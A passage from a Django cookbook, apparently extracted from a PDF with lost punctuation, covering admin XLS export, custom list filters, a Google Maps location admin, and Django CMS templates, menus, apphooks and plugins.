queryset :     response = HttpResponse          content_type="application ms-excel"           response["Content-Disposition"] = "attachment; "\         "filename=products.xls"     wb = xlwt.Workbook encoding="utf-8"      ws = wb.add_sheet "Products"       row_num = 0       Print Title Row      columns = [          column name, column width          "ID", 2000 ,          "Title", 6000 ,          "Description", 8000 ,          "Price  € ", 3000 ,     ]      header_style = xlwt.XFStyle    325  Chapter 6       header_style.font.bold = True      for col_num,  item, width  in enumerate columns :         ws.write row_num, col_num, item, header_style           set column width         ws.col col_num .width = width      text_style = xlwt.XFStyle       text_style.alignment.wrap = 1      price_style = xlwt.XFStyle       price_style.num_format_str = "0.00"      styles = [         text_style, text_style, text_style,         price_style, text_style     ]      for obj in queryset.order_by "pk" :         row_num += 1         project_photos = obj.productphoto_set.all  [:1]         url = ""         if project_photos:             url = "http:  {0}{1}".format                  request.META['HTTP_HOST'],                 project_photos[0].photo.url,                       row = [             obj.pk,             obj.title,             obj.description,             obj.price,             url,         ]         for col_num, item in enumerate row :             ws.write                  row_num, col_num, item, styles[col_num]                    wb.save response      return response  export_xls.short_description = _ "Export XLS"   326  Model Administration   2.  Then, add the actions setting to ProductAdmin, as follows:  class ProductAdmin admin.ModelAdmin :      ...     actions = [export_xls]  How it works... If you take a look at the product administration list page in the browser, you will see a new  action called Export XLS, along with the default Delete selected Products action, as shown   in the following screenshot:  327  Chapter 6   By default, admin actions do something with QuerySet and redirect the administrator back  to the change list page. However, for more complex actions like these, HttpResponse can  be returned. The export_xls   function returns HttpResponse with the content type  of the Excel spreadsheet. Using the Content-Disposition header, we set the response to be  downloadable with the products.xls file.  Then, we use the xlwt Python module to create the Excel file.  At first, a workbook with UTF-8 encoding is created. Then, we add a sheet named Products  to it. We will be using the write   method of the sheet to set the content and style for each  cell and the col   method to retrieve the column and set its width.  To get an overview of all the columns in the sheet, we will create a list of tuples with column  names and widths. Excel uses some magical units for the widths of the columns. They are  1 256 of the width of the zero character in the default font. Next, we will define the header  style as bold. As we have the columns defined, we will loop through them and fill the first row  with the column names, also assigning the bold style to them.  Then, we will create a style for normal cells and prices. The text in normal cells will be  wrapped in multiple lines. The prices will have a special number style with two numbers after  the decimal point.  Lastly, we will go through QuerySet of the selected products ordered by ID and print the  specified fields in the corresponding cells, also applying the specific styles.  The workbook is saved to the file-like HttpResponse object and the resulting Excel sheet  looks similar to the following:  ID 1  Title Ryno  Price  €  3865.00  Preview http:  127.0.0.1:8000  media products  ryno 20140523044813.jpg  2  Mercury Skate  http:  127.0.0.1:8000  media products mercury- skate 20140521030128.png  Description With the Ryno  microcycle, you're not  limited to the street  or the bike lane.

Additionally, there  is a possibility of having custom-tailored filters. In this recipe, we will add a filter that allows  you to select products by the number of photos attached to them.  Getting ready Let's start with the products app that we created in the previous recipe.  How to do it... Execute the following two steps:  1.   In the admin.py file, create a PhotoFilter class extending from  SimpleListFilter, as follows:  products admin.py  -*- coding: UTF-8 -*-  ... all previous imports go here ... from django.db import models  class PhotoFilter admin.SimpleListFilter :      Human-readable title which will be displayed in the      right admin sidebar just above the filter options.  329  Chapter 6       title = _ "photos"        Parameter for the filter that will be used in the      URL query.     parameter_name = "photos"      def lookups self, request, model_admin :         """         Returns a list of tuples. The first element in each         tuple is the coded value for the option that will         appear in the URL query. The second element is the         human-readable name for the option that will appear         in the right sidebar.         """         return                "zero", _ "Has no photos"  ,              "one", _ "Has one photo"  ,              "many", _ "Has more than one photo"  ,                def queryset self, request, queryset :         """         Returns the filtered queryset based on the value         provided in the query string and retrievable via         `self.value  `.         """         qs = queryset.annotate              num_photos=models.Count "productphoto"                    if self.value   == "zero":             qs = qs.filter num_photos=0          elif self.value   == "one":             qs = qs.filter num_photos=1          elif self.value   == "many":             qs = qs.filter num_photos__gte=2          return qs  2.  Then, add a list filter to ProductAdmin, as shown in the following code:  class ProductAdmin admin.ModelAdmin :      ...     list_filter = [PhotoFilter]  330  Model Administration   How it works... The list filter that we just created will be shown in the sidebar of the product list, as follows:  The PhotoFilter class has translatable title and query parameter names as properties.   It also has two methods: the lookups   method that defines the choices of the filter and   the queryset   method that defines how to filter QuerySet objects when a specific value   is selected.  In the lookups   method, we define three choices: there are no photos, there is one  photo, and there is more than one photo attached. In the queryset   method, we use the  annotate   method of QuerySet to select the count of photos for each product. This count  of the photos is then filtered according to the selected choice.

The default user administration list looks similar to the following screenshot:  The default group administration list looks similar to the following screenshot:  334  Model Administration   In this recipe, we created two model admin classes, UserAdminExtended and  GroupAdminExtended, which extend the contributed UserAdmin and GroupAdmin  classes, respectively, and overwrite some of the properties. Then, we unregistered the existing  administration classes for the User and Group models and registered the new modified ones.  The following screenshot is how the user administration will look now:  The modified user administration settings show more fields than the default settings in the   list view, add additional filters and ordering options, and show Submit buttons at the top of   the editing form.  335  Chapter 6   In the change list of the new group administration settings, we will display the users who are  assigned to the specific groups. This looks similar to the following screenshot in the browser:  There's more... In our Python code, we used a new way to format the strings.

In this recipe, we  will create a locations app with the Location model and extend the template of the  change form in order to add a map where an administrator can find and mark geographical  coordinates of a location.  336  Model Administration   Getting ready We will start with the locations app that should be put under INSTALLED_APPS in the  settings. Create a Location model there with a title, description, address, and geographical  coordinates, as follows:   locations models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import python_2_unicode_compatible  COUNTRY_CHOICES =        "UK", _ "United Kingdom"  ,      "DE", _ "Germany"  ,      "FR", _ "France"  ,      "LT", _ "Lithuania"  ,    @python_2_unicode_compatible class Location models.Model :     title = models.CharField _ "title" , max_length=255,         unique=True      description = models.TextField _ "description" , blank=True      street_address = models.CharField _ "street address" ,         max_length=255, blank=True      street_address2 = models.CharField          _ "street address  2nd line " , max_length=255,         blank=True      postal_code = models.CharField _ "postal code" ,         max_length=10, blank=True      city = models.CharField _ "city" , max_length=255, blank=True      country = models.CharField _ "country" , max_length=2,         blank=True, choices=COUNTRY_CHOICES      latitude = models.FloatField _ "latitude" , blank=True,         null=True,         help_text=_ "Latitude  Lat.  is the angle between "             "any point and the equator "             " north pole is at 90; south pole is at -90 ."       longitude = models.FloatField _ "longitude" , blank=True,         null=True,         help_text=_ "Longitude  Long.  is the angle "             "east or west of "  337  Chapter 6               "an arbitrary point on Earth from Greenwich  UK , "             "which is the international zero-longitude point "             " longitude=0 degrees .

The administration of the Location model is as simple as it can be. Perform the   following steps:  1.  Let's create the administration settings for the Location model. Note that we are   using the get_fieldsets   method to define the field sets with a description  rendered from a template, as follows:  locations admin.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.utils.translation import ugettext_lazy as _ from django.contrib import admin from django.template.loader import render_to_string from .models import Location  class LocationAdmin admin.ModelAdmin :     save_on_top = True     list_display =  "title", "street_address",         "description"      search_fields =  "title", "street_address",         "description"       def get_fieldsets self, request, obj=None :         map_html = render_to_string              "admin includes map.html"                   fieldsets = [              _ "Main Data" , {"fields":  "title",                 "description" } ,              _ "Address" , {"fields":  "street_address",                 "street_address2", "postal_code", "city",  338  Model Administration                   "country", "latitude", "longitude" } ,              _ "Map" , {"description": map_html,                 "fields": []} ,         ]         return fieldsets  admin.site.register Location, LocationAdmin   2.  To create a custom change form template, add a new change_form.html file under   admin locations location  in your templates directory. This template will  extend from the default admin change_form.html template and will overwrite the  extrastyle and field_sets blocks, as follows: { myproject templates admin locations location change_form.html  } {% extends "admin change_form.html" %} {% load i18n admin_static admin_modify %} {% load url from future %} {% load admin_urls %}  {% block extrastyle %}     {{ block.super }}     <link rel="stylesheet" type="text css" href="{{ STATIC_URL }} site css locating.css"  > {% endblock %}  {% block field_sets %}     {% for fieldset in adminform %}         {% include "admin includes fieldset.html" %}     {% endfor %}     <script type="text javascript" src="http:  maps.google.com  maps api js?language=en">      <script type="text javascript" src="{{ STATIC_URL }}site js  locating.js">  {% endblock %}  3.  Then, we need to create the template for the map that will be inserted in the Map    field set: { myproject templates admin includes map.html } {% load i18n %}                 <!-- THE GMAPS WILL BE INSERTED HERE         DYNAMICALLY -->                            <button id="locate_address" type="button"  339  Chapter 6   4.  Of course, the map won't be styled by default. Therefore, we have to add some CSS,           class="secondaryAction">             {% trans "Locate address" %}                   <button id="remove_geo" type="button"         class="secondaryAction">             {% trans "Remove from map" %}                    as shown in the following code:  * site_static site css locating.css *  map_canvas {     width:722px;     height:300px;     margin-bottom: 8px; } map_locations {     width:722px;     margin: 0;     padding: 0;     margin-bottom: 8px; } map_locations li {     border-bottom: 1px solid ccc;     list-style: none; } map_locations li:first-child {     border-top: 1px solid ccc; } .buttonHolder {     width:722px; } remove_geo {     float: right; }  5.  Then, let's create a locating.js JavaScript file. We will be using jQuery in this  file, as jQuery comes with the contributed administration system and makes the  work easy and cross-browser. We don't want to pollute the environment with global  variables, therefore, we will start with a closure to make a private scope for variables  and functions  a closure is the local variables for a function kept alive after the  function has returned , as follows:    site_static site js locating.js  function  $, undefined  {  340  Model Administration       var gMap;     var gettext = window.gettext  function  val  {         return val;     };     var gMarker;         ... this is where all the further JavaScript        functions go ...  } django.jQuery  ;  6.  We will create JavaScript functions one by one. The getAddress4search    function will collect the address string from the address fields that can later   be used for geocoding, as follows: function getAddress4search   {     var address = [];     var sStreetAddress2 = $ 'id_street_address2' .val  ;     if  sStreetAddress2  {         sStreetAddress2 = ' ' + sStreetAddress2;     }     address.push $ 'id_street_address' .val   + sStreetAddress2 ;     address.push $ 'id_city' .val   ;     address.push $ 'id_country' .val   ;     address.push $ 'id_postal_code' .val   ;     return address.join ', ' ; }  7.  The updateMarker   function will take the latitude and longitude arguments and   draw or move a marker on the map. It also makes the marker draggable: function updateMarker lat, lng  {     var point = new google.maps.LatLng lat, lng ;     if  gMarker  {         gMarker.setPosition point ;     } else {         gMarker = new google.maps.Marker {             position: point,             map: gMap         } ;     }     gMap.panTo point, 15 ;     gMarker.setDraggable true ;     google.maps.event.addListener gMarker, 'dragend', function   {         var point = gMarker.getPosition  ;         updateLatitudeAndLongitude point.lat  , point.lng   ;     } ; }  341  Chapter 6   8.  The updateLatitudeAndLongitude   function takes the latitude and longitude   arguments and updates the values for the fields with the IDs id_latitude and  id_longitude, as follows: function updateLatitudeAndLongitude lat, lng  {     lat = Math.round lat * 1000000    1000000;     lng = Math.round lng * 1000000    1000000;     $ 'id_latitude' .val lat ;     $ 'id_longitude' .val lng ; }  9.  The autocompleteAddress   function gets the results from Google Maps   geocoding and lists them under the map in order to select the correct one, or if there  is just one result, it updates the geographical position and address fields, as follows: function autocompleteAddress results  {     var $foundLocations = $ 'map_locations' .html '' ;     var i, len = results.length;         console.log JSON.stringify results, null, 4  ;      if  results  {         if  len > 1  {             for  i=0; i<len; i++  {                 $ ' ' + results[i].formatted_address +  ' ' .data 'gmap_index', i .click function  e  {                     e.preventDefault  ;                     var result = results[$ this .data 'gmap_ index' ];                     updateAddressFields result.address_ components ;                     var point = result.geometry.location;                     updateLatitudeAndLongitude point.lat  , point. lng   ;                     updateMarker point.lat  , point.lng   ;                     $foundLocations.hide  ;                 } .appendTo $ ' ' .appendTo $foundLocations  ;             }             $ ' ' + gettext 'None of the listed'  + '<  a>' .click function  e  {                 e.preventDefault  ;                 $foundLocations.hide  ;             } .appendTo $ ' ' .appendTo $foundLocations  ;             $foundLocations.show  ;         } else {             $foundLocations.hide  ;             var result = results[0];             updateAddressFields result.address_components ;  342  Model Administration               var point = result.geometry.location;             updateLatitudeAndLongitude point.lat  , point.lng   ;             updateMarker point.lat  , point.lng   ;         }     } }  10.  The updateAddressFields   function takes a nested dictionary with the address   components as an argument and fills in all the address fields: function updateAddressFields addressComponents  {     var i, len=addressComponents.length;     var streetName, streetNumber;     for  i=0; i<len; i++  {         var obj = addressComponents[i];         var obj_type = obj.types[0];         if  obj_type == 'locality'  {             $ 'id_city' .val obj.long_name ;         }         if  obj_type == 'street_number'  {             streetNumber = obj.long_name;         }         if  obj_type == 'route'  {             streetName = obj.long_name;         }         if  obj_type == 'postal_code'  {             $ 'id_postal_code' .val obj.long_name ;         }         if  obj_type == 'country'  {             $ 'id_country' .val obj.short_name ;         }     }     if  streetName  {         var streetAddress = streetName;         if  streetNumber  {             streetAddress += ' ' + streetNumber;         }         $ 'id_street_address' .val streetAddress ;     } }  11.  Finally, we have the initialization function that is called on the page load. It attaches   the onclick event handlers to the buttons, creates a Google Map, and initially  marks the geoposition that is defined in the latitude and longitude fields,   as follows: $ function   {     $ 'locate_address' .click function   {  343  Chapter 6           var oGeocoder = new google.maps.Geocoder  ;         oGeocoder.geocode              {address: getAddress4search  },             function  results, status  {                 if  status === google.maps.GeocoderStatus.OK  {                     autocompleteAddress results ;                 } else {                     autocompleteAddress false ;                 }             }          ;     } ;      $ 'remove_geo' .click function   {         $ 'id_latitude' .val '' ;         $ 'id_longitude' .val '' ;         gMarker.setMap null ;         gMarker = null;     } ;      gMap = new google.maps.Map $ 'map_canvas' .get 0 , {         scrollwheel: false,         zoom: 16,         center: new google.maps.LatLng 51.511214, -0.119824 ,         disableDoubleClickZoom: true     } ;     google.maps.event.addListener gMap, 'dblclick',  function event  {         var lat = event.latLng.lat  ;         var lng = event.latLng.lng  ;         updateLatitudeAndLongitude lat, lng ;         updateMarker lat, lng ;     } ;     $ 'map_locations' .hide  ;      var $lat = $ 'id_latitude' ;     var $lng = $ 'id_longitude' ;     if  $lat.val   && $lng.val    {         updateMarker $lat.val  , $lng.val   ;     } } ;  344  Model Administration   How it works... If you look at the location change form in the browser, you will see a map shown in a field set  followed by the field set containing the address fields, as shown in the following screenshot:  Under the map, there are two buttons: Locate address and Remove from map.  345  Chapter 6   When you click on the Locate address button, the geocoding is called in order to search for  the geographical coordinates of the entered address. The result of geocoding is either one  or more addresses with latitudes and longitudes in a nested dictionary format. To see the  structure of the nested dictionary in the console of the developer tools, put the following line  in the beginning of the autocompleteAddress   function:  console.log JSON.stringify results, null, 4  ;  If there is just one result, the missing postal code or other missing address fields are  populated, the latitude and longitude are filled in and a marker is put at a specific place on  the map. If there are more results, the entire list is shown under the map with the option to  select the correct one, as shown in the following screenshot:  346  Model Administration   Then, the administrator can move the marker on the map by dragging and dropping. Also,  a double-click anywhere on the map will update the geographical coordinates and marker  position.  Finally, if the Remove from map button is clicked, the geographical coordinates are cleaned  and the marker is removed.

Django CMS takes care of a website's structure, provides  navigation menus, makes it easy to edit page content in the frontend, and supports multiple  languages in a website. You can also extend it according to your needs using the provided  hooks. To create a website, you need to create a hierarchical structure of the pages, where  each page has a template. Templates have placeholders that can be assigned different  plugins with the content. Using special template tags, the menus can be generated out of the  hierarchical page structure. The CMS takes care of URL mapping to specific pages.  In this chapter, we will look at Django CMS 3.1 from a developer's perspective. We will see  what is necessary for the templates to function and take a look at the possible page structure  for header and footer navigation. You will also learn how to attach the URL rules of an app to a  CMS page tree node. Then, we will attach the custom navigation to the page menu and create  our own CMS content plugins. Finally, you will learn how to add new fields to the CMS pages.  349   Although in this book, I won't guide you through all the bits and pieces of using Django CMS;  by the end of this chapter, you will be aware of its purpose and use. The rest can be learned  from the official documentation at http:  docs.django-cms.org en develop  and by  trying out the frontend user interface of the CMS.  Creating templates for Django CMS For every page in your page structure, you need to choose a template from the list of  templates that are defined in the settings. In this recipe, we will look at the minimum  requirements for these templates.  Getting ready If you want to start a new Django CMS project, execute the following commands in a virtual  environment and answer all the prompted questions:   myproject_env $ pip install djangocms-installer   myproject_env $ djangocms -p project myproject myproject  Here, project myproject is the path where the project will be created and myproject is  the project name.  On the other hand, if you want to integrate Django CMS in an existing project, check the  official documentation at http:  docs.django-cms.org en latest how_to  install.html.  How to do it... We will update the Bootstrap-powered base.html template so that it contains everything  that Django CMS needs. Then, we will create and register two templates, default.html and  start.html, to choose from for CMS pages:  1.  First of all, we will update the base template that we created in the Arranging the   base.html template recipe in Chapter 4, Templates and JavaScript, as follows: { templates base.html }   {% load i18n cms_tags sekizai_tags menu_tags %}               <meta name="viewport" content="width=device-width, initial- scale=1"  >      {% block title %}{% endblock %}{% trans "My Website"  %}   350  Django CMS       <link rel="icon" href="{{ STATIC_URL }}site img favicon.ico"  type="image png"  >         {% block meta_tags %}{% endblock %}         {% render_block "css" %}     {% block base_stylesheet %}         <link rel="stylesheet" href="  maxcdn.bootstrapcdn.com  bootstrap 3.3.5 css bootstrap.min.css"  >         <link href="{{ STATIC_URL }}site css style.css"  rel="stylesheet" media="screen" type="text css"  >     {% endblock %}     {% block stylesheet %}{% endblock %}         {% block base_js %}          <  script>         <script src="  code.jquery.com jquery-migrate-1.2.1.min. js">          <script src="  maxcdn.bootstrapcdn.com bootstrap 3.3.5 js  bootstrap.min.js">      {% endblock %}     {% block js %}{% endblock %}     {% block extrahead %}{% endblock %}   <body class="{% block bodyclass %}{% endblock %} {{ request. current_page.cssextension.body_css_class }}">     {% cms_toolbar %}     {% block page %}                                          {% trans "My Website" %}                  <nav class="navbar navbar-default"  role="navigation">                     {% block header_navigation %}                                                       {% show_menu_below_id "start_page" 0 1  1 1 %}                                               {% endblock %}                     {% block language_chooser %}                                                       {% language_chooser %}                                               {% endblock %}  351  Chapter 7                                                                 {% block content %}                 {% endblock %}                                              {% block footer_navigation %}                     <nav class="navbar navbar-default"  role="navigation">                                                       {% show_menu_below_id "footer_ navigation" 0 1 1 1 %}                                                                 {% endblock %}                             {% endblock %}     {% block extrabody %}{% endblock %}     {% render_block "js" %}      2.  Then, we will create a cms directory under templates and add two templates for   CMS pages: default.html for normal pages and start.html for the home page,  as follows: { templates cms default.html } {% extends "base.html" %} {% load cms_tags %}  {% block title %}{% page_attribute "page_title" %} - {% endblock  %}  {% block meta_tags %}     <meta name="description" content="{% page_attribute meta_ description %}" > {% endblock %}  {% block content %}      {% page_attribute "page_title" %}                              {% placeholder main_content %}            352  Django CMS                         {% placeholder sidebar %}                 {% endblock %}  { templates cms start.html } {% extends "base.html" %} {% load cms_tags %}  {% block meta_tags %}     <meta name="description" content="{% page_attribute meta_ description %}" > {% endblock %}  {% block content %}     <!--     Here goes very customized website-specific content like  slideshows, latest tweets, latest news, latest profiles, etc.     --> {% endblock %}  3.  Lastly, we will set the paths of these two templates in the settings, as shown in    the following:  conf base.py or settings.py CMS_TEMPLATES =        "cms default.html", gettext "Default"  ,      "cms start.html", gettext "Homepage"  ,    How it works... As usual, the base.html template is the main template that is extended by all the other  templates. In this template, Django CMS uses the {% render_block %} template tag from  the django-sekizai module to inject CSS and JavaScript in the templates that create a  toolbar and other administration widgets in the frontend. We will insert the {% cms_toolbar  %} template tag at the beginning of the   section—that's where the toolbar will be  placed. We will use the {% show_menu_below_id %} template tag to render the header  and footer menus from the specific page menu trees. Also, we will use the {% language_ chooser %} template tag to render the language chooser that switches to the same page in  different languages.  353  Chapter 7   The default.html and start.html templates that are defined in the CMS_TEMPLATES  setting will be available as a choice when creating a CMS page. In these templates, for each  area that needs to have dynamically entered content, add a {% placeholder %} template  tag when you need page-specific content or {% static_placeholder %} when you need  the content that is shared among different pages. Logged-in administrators can add content  plugins to the placeholders when they switch from the Live mode to the Draft mode in the  CMS toolbar and switch to the Structure section.  See also   f The Arranging the base.html template recipe in Chapter 4, Templates and JavaScript  f The Structuring the page menu recipe  Structuring the page menu In this recipe, we will discuss some guidelines about defining the tree structures for the pages  of your website.  Getting ready It is good practice to set the available languages for your website before creating the structure  of your pages  although the Django CMS database structure also allows you to add new  languages later . Besides LANGUAGES, make sure that you have CMS_LANGUAGES set in your  settings. The CMS_LANGUAGES setting defines which languages should be active for each  Django site, as follows:   conf base.py or settings.py  ... from __future__ import unicode_literals gettext = lambda s: s  LANGUAGES =        "en", "English" ,      "de", "Deutsch" ,      "fr", "Français" ,      "lt", "Lietuvių kalba" ,    CMS_LANGUAGES = {     "default": {         "public": True,         "hide_untranslated": False,  354  Django CMS           "redirect_on_fallback": True,     },     1: [         {             "public": True,             "code": "en",             "hide_untranslated": False,             "name": gettext "en" ,             "redirect_on_fallback": True,         },         {             "public": True,             "code": "de",             "hide_untranslated": False,             "name": gettext "de" ,             "redirect_on_fallback": True,         },         {             "public": True,             "code": "fr",             "hide_untranslated": False,             "name": gettext "fr" ,             "redirect_on_fallback": True,         },         {             "public": True,             "code": "lt",             "hide_untranslated": False,             "name": gettext "lt" ,             "redirect_on_fallback": True,         },     ], }  355  Chapter 7   How to do it... The page navigation is set in tree structures. The first tree is the main tree and, contrary to the  other trees, the root node of the main tree is not reflected in the URL structure. The root node  of this tree is the home page of the website. Usually, this page has a specific template, where  you add the content aggregated from different apps; for example, a slideshow, actual news,  newly registered users, latest tweets, or other latest or featured objects. For a convenient  way to render items from different apps, check the Creating a template tag to a QuerySet in a  template recipe in Chapter 5, Custom Template Filters and Tags.  If your website has multiple navigations such as a top, meta, and footer navigation, give an ID  to the root node of each tree in the Advanced settings of the page. This ID will be used in the  base template by the {% show_menu_below_id %} template tag. You can read more about  this and other menu-related template tags in the official documentation at http:  docs. django-cms.org en latest reference navigation.html.  The first tree defines the main structure of the website. If you want a page under the root-level  URL, for example,  en search  but not  en meta search , put this page under the home  page. If you don't want a page to be shown in the menu as it will be linked from an icon or  widget, just hide it from the menu.  The footer navigation usually shows different items than the top navigation with some of the  items being repeated, for example, the page for developers will be shown only in the footer;  whereas, the page for news will be shown in both header and footer. For all the repeated  items, just create a page with the Redirect setting in the advanced settings of the page and  set it to the original page in the main tree. By default, when you create a secondary tree  structure, all pages under the root of that tree will include the slug of the root page in their  URL paths. If you want to skip the slug of the root in the URL path, you will need to set the  Overwrite URL setting in the advanced settings of the page. For example, the developers page  should be under  en developers  and not  en secondary developers .  356  Django CMS   How it works... Finally, your page structure will look similar to the following image  of course, the page  structure can be much more complex too :  See also   f The Creating a template tag to load a QuerySet in a template recipe in Chapter 5,   Custom Template Filters and Tags   f The Creating templates for Django CMS recipe  f The Attaching your own navigation recipe  357  Chapter 7   Converting an app to a CMS app The simplest Django CMS website will have the whole page tree created using administration  interface. However, for real-world cases, you will probably need to show forms or lists of  objects under some page nodes. If you have created an app that is responsible for some type  of objects in your website, such as movies, you can easily convert it to a Django CMS app and  attach it to one of the pages. This will ensure that the root URL of the app is translatable and  the menu item is highlighted when selected. In this recipe, we will convert the movies app to  a CMS app.  Getting ready Let's start with the movies app that we created in the Filtering object lists recipe in   Chapter 3, Forms and Views.  How to do it... Follow these steps to convert a usual movies Django app to a Django CMS app:  1.  First of all, remove or comment out the inclusion of the URL configuration of the app   as it will be included by an apphook in Django CMS, as follows:  myproject urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import patterns, include, url from django.conf import settings from django.conf.urls.static import static from django.contrib.staticfiles.urls import \     staticfiles_urlpatterns from django.conf.urls.i18n import i18n_patterns from django.contrib import admin admin.autodiscover    urlpatterns = i18n_patterns "",      remove or comment out the inclusion of app's urls      url r"^movies ", include "movies.urls"  ,      url r"^admin ", include admin.site.urls  ,     url r"^", include "cms.urls"  ,   urlpatterns += staticfiles_urlpatterns   urlpatterns += static settings.MEDIA_URL,     document_root=settings.MEDIA_ROOT   358  Django CMS   2.  Create a cms_app.py file in the movies directory and create MoviesApphook   there, as follows:  movies cms_app.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.utils.translation import ugettext_lazy as _ from cms.app_base import CMSApp from cms.apphook_pool import apphook_pool  class MoviesApphook CMSApp :     name = _ "Movies"      urls = ["movies.urls"]  apphook_pool.register MoviesApphook   3.  Set the newly created apphook in the settings, as shown in the following:   settings.py CMS_APPHOOKS =        ...     "movies.cms_app.MoviesApphook",    4.  Finally, in all the movie templates, change the first line to extend from the template of   the current CMS page instead of base.html, as follows: { templates movies movies_list.html }  Change {% extends "base.html" %}  to {% extends CMS_TEMPLATE %}  How it works... Apphooks are the interfaces that join the URL configuration of apps to the CMS pages.  Apphooks need to extend from CMSApp. To define the name, which will be shown in the  Application selection list under the Advanced settings of a page, put the path of the apphook  in the CMS_APPHOOKS project setting and restart the web server; the apphook will appear  as one of the applications in the advanced page settings. After selecting an application for a  page, you need to restart the server for the URLs to take effect.  The templates of the app should extend the page template if you want them to contain   the placeholders or attributes of the page, for example, the title or the description   meta tag.  359  Chapter 7   See also   f The Filtering object lists recipe in Chapter 3, Forms and Views  f The Attaching your own navigation recipe  Attaching your own navigation Once you have an app hooked in the CMS pages, all the URL paths under the page node will  be controlled by the urls.py file of the app. To add some menu items under this page, you  need to add a dynamical branch of navigation to the page tree. In this recipe, we will improve  the movies app and add new navigation items under the Movies page.  Getting ready Let's say that we have a URL configuration for different lists of movies: editor's picks,  commercial movies, and independent movies, as shown in the following code:   movies urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import url, patterns from django.shortcuts import redirect  urlpatterns = patterns "movies.views",     url r"^$", lambda request: redirect "featured_movie_list"  ,     url r"^editors-picks $", "movie_list", {"featured": True},         name='featured_movie_list' ,     url r"^commercial $", "movie_list", {"commercial": True},         name="commercial_movie_list" ,     url r"^independent $", "movie_list", {"independent": True},         name="independent_movie_list" ,     url r"^ ?P [^ ]+  $", "movie_detail",         name="movie_detail" ,    360  Django CMS   How to do it... Follow these two steps to attach the Editor's Picks, Commercial Movies, and Independent  Movies menu choices to the navigational menu under the Movies page:  1.  Create the menu.py file in the movies app and add the following MoviesMenu   class, as follows:  movies menu.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.utils.translation import ugettext_lazy as _ from django.core.urlresolvers import reverse from menus.base import NavigationNode from menus.menu_pool import menu_pool from cms.menu_bases import CMSAttachMenu  class MoviesMenu CMSAttachMenu :     name = _ "Movies Menu"       def get_nodes self, request :         nodes = [             NavigationNode                  _ "Editor's Picks" ,                 reverse "featured_movie_list" ,                 1,              ,             NavigationNode                  _ "Commercial Movies" ,                 reverse "commercial_movie_list" ,                 2,              ,             NavigationNode                  _ "Independent Movies" ,                 reverse "independent_movie_list" ,                 3,              ,         ]         return nodes  menu_pool.register_menu MoviesMenu   2.  Restart the web server and then edit the Advanced settings of the Movies page and   select Movies Menu for the Attached menu setting.  361  Chapter 7   How it works... In the frontend, you will see the new menu items attached to the Movies page, as shown in  the following image:  Dynamic menus that are attachable to pages need to extend CMSAttachMenu, define the  name by which they will be selected, and define the get_nodes   method that returns a list  of NavigationNode objects. The NavigationNode class takes at least three parameters:  the title of the menu item, the URL path of the menu item, and the ID of the node. The IDs  can be chosen freely with the only requirement being that they have to be unique among this  attached menu. The other optional parameters are as follows:   f parent_id: This is the ID of the parent node if you want to create a hierarchical    f parent_namespace: This is the name of another menu if this node is to be attached   to a different menu tree, for example, the name of this menu is "MoviesMenu"   f attr: This is a dictionary of the additional attributes that can be used in a template   dynamical menu  or menu modifier   f visible: This sets whether or not the menu item should be visible  For other examples of attachable menus, refer to the official documentation at   https:  django-cms.readthedocs.org en latest how_to menus.html.  See also   f The Structuring the page menu recipe  f The Converting an app to a CMS app recipe  362  Django CMS   Writing your own CMS plugin Django CMS comes with a lot of content plugins that can be used in template placeholders,  such as the text, flash, picture, and Google map plugins. However, for more structured and  better styled content, you will need your own custom plugins, which are not too difficult to  implement. In this recipe, we will see how to create a new plugin and have a custom layout for  its data, depending on the chosen template of the page.  Getting ready Let's create an editorial app and mention it in the INSTALLED_APPS setting. Also, we  will need the cms magazine.html template that was created and mentioned in the CMS_ TEMPLATES setting; you can simply duplicate the cms default.html template for this.  How to do it... To create the EditorialContent plugin, follow these steps:  1.   In the models.py file of the newly created app, add the EditorialContent model  extending from CMSPlugin. The EditorialContent model will have the following  fields: title, subtitle, description, website, image, image caption, and a CSS class:  editorial models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import os from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.timezone import now as tz_now from cms.models import CMSPlugin from cms.utils.compat.dj import python_2_unicode_compatible  def upload_to instance, filename :     now = tz_now       filename_base, filename_ext = \         os.path.splitext filename      return "editorial %s%s" %           now.strftime "%Y %m %Y%m%d%H%M%S" ,         filename_ext.lower  ,        @python_2_unicode_compatible class EditorialContent CMSPlugin :  363  Chapter 7       title = models.CharField _ "Title" , max_length=255      subtitle = models.CharField _ "Subtitle" ,         max_length=255, blank=True      description = models.TextField _ "Description" ,         blank=True      website = models.CharField _ "Website" ,         max_length=255, blank=True       image = models.ImageField _ "Image" , max_length=255,         upload_to=upload_to, blank=True      image_caption = models.TextField _ "Image Caption" ,         blank=True       css_class = models.CharField _ "CSS Class" ,         max_length=255, blank=True       def __str__ self :         return self.title      class Meta:         ordering = ["title"]         verbose_name = _ "Editorial content"          verbose_name_plural = _ "Editorial contents"   2.   In the same app, create a cms_plugins.py file and add a  EditorialContentPlugin class extending CMSPluginBase. This class is a   little bit like ModelAdmin—it defines the appearance of administration settings   for the plugin:  editorial cms_plugins.py  -*- coding: utf-8 -*- from __future__ import unicode_literals from django.utils.translation import ugettext as _ from cms.plugin_base import CMSPluginBase from cms.plugin_pool import plugin_pool from .models import EditorialContent  class EditorialContentPlugin CMSPluginBase :     model = EditorialContent     name = _ "Editorial Content"      render_template = "cms plugins editorial_content.html"      fieldsets =            _ "Main Content" , {             "fields":    364  Django CMS                   "title", "subtitle", "description",                 "website" ,             "classes": ["collapse open"]         } ,          _ "Image" , {             "fields":  "image", "image_caption" ,             "classes": ["collapse open"]         } ,          _ "Presentation" , {             "fields":  "css_class", ,             "classes": ["collapse closed"]         } ,            def render self, context, instance, placeholder :         context.update {             "object": instance,             "placeholder": placeholder,         }          return context  plugin_pool.register_plugin EditorialContentPlugin   3.  To specify which plugins go to which placeholders, you have to define the   CMS_PLACEHOLDER_CONF setting. You can also define the extra context for the  templates of the plugins that are rendered in a specific placeholder. Let's allow  EditorialContentPlugin for the main_content placeholder and set the  editorial_content_template context variable for the main_content  placeholder in the cms magazine.html template, as follows:  settings.py CMS_PLACEHOLDER_CONF = {     "main_content": {         "name": gettext "Main 